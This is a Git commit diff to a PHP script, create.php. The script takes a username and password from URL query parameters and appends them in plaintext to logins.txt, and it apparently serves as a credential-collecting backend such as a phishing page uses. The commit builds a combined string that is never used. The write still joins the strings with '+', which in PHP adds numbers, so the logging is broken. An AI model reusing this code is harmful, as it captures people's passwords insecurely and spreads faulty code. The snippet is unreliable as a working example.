53da9dbc73a813c2fa72f7ec90b3b69e6b6b42e0
cubesniper24 <46076583+cubesniper24@users.noreply.github.com>
2021-02-11 16:24:43 -0500

    Update create.php

--- create.php
+++ create.php
@@ -1,7 +1,8 @@
 <?php
 $password = $_GET['password'];
 $username = $_GET['username'];
-//$combo = $username + $password;
+$combo = $username;
+$combo .= $password;
 fopen("logins.txt", "a");
 $file = fopen("logins.txt", "a");
 fwrite($file, $username + $password);
